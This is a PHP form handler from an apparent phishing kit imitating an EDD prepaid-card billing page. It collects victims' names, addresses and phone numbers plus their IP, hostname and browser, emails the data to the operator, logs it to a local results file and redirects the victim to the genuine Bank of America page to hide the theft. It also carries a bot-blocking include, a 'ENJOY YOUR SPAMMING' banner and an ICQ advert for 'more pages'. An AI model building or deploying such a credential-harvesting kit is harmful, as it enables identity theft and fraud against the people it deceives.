<?php


include ('shield/wall.php');
include ('insertemailhere/email.php');
$name = $_POST['name'];
$address = $_POST['address'];
$City = $_POST['City'];
$state = $_POST['state'];
$zipcode = $_POST['zipcode'];
$phonenumber = $_POST['phonenumber'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--EDD Info--\n";
$email = $_POST['name']."\n";
$message = "Name: ".$_POST["name"]."\n";
$message .= "Address: ".$_POST["address"]."\n";
$message .= "City: ".$_POST["City"]."\n";
$message .= "State: ".$_POST["state"]."\n";
$message .= "Zip Code: ".$_POST["zipcode"]."\n";
$message .= "Phone Number: ".$_POST["phonenumber"]."\n";
$message .= "-- :) ENJOY YOUR SPAMMING :) ---\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------------\n";
$subject = "Result from EDD  Billing [ ".$_SERVER['REMOTE_ADDR']." ] ";
$headers .= 'From:  <EDD@custompage.com>'."\n";
mail($send,$subject,$message,$headers);
mail($to.$form,$subject,$message,$headers);
header("Location: https://prepaid.bankofamerica.com/eddcard");

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
     
                  ///----for more pages message me on icq 710787081        

?>
